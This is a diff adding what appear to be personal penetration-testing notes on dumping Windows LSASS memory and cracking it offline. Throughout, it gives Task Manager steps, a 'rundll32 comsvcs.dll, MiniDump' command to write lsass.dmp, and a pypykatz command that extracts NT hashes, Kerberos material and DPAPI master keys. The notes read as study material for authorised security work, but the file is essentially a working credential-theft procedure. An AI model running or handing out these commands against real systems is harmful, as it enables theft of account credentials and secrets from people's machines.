@@ -1,0 +1,38 @@
+DUMPING LSASS PROCESS MEMORY (to crack offline)
+
+
+TASK MANAGER METHOD:
+1. Open Task Manager
+2. Select the Processes tab
+3. Find and right click the 'Local Security Authority Process'
+4. Select Create dump file
+5. lsass.DMP is created and saved in %temp%, which can be transfered to host
+
+
+Rundll32.exe & Comsvcs.dll method:
+find LSASS' PID in cmd:
+tasklist /svc
+or powershell:
+Get-Process lsass
+
+in system32, create dumpfile w/ powershell:
+rundll32 comsvcs.dll, MiniDump 672 C:\lsass.dmp full
+
+
+^ CRACK w/ PYPYKATZ:
+(pypykatz is able to run on linux, compared to mimikatz.exe being windows-only)
+pypykatz lsa minidump /home/user/Documents/lsass.dmp
+
+^ MSV NOTES:
+it's an authentication package in Windows that LSA calls to validate logon attempts;
+Can extract the SID, Username, Domain, and even NT & SH1 password hashes associated w/ the user account
+
+^WDIGEST NOTES:
+an older authentication protocol enabled by default in Windows XP - Windows 8 and windows Server 2003 - Windows server 2012
+
+^KERBEROS NOTES:
+it's a network authentication protocol used by Active Directory in Windows Domain environments.
+
+^DPAPI NOTES:
+DPAPI masterkey can be extracted;
+masterkeys can be used to decrypt secrets associated with each of the applications using DPAPI
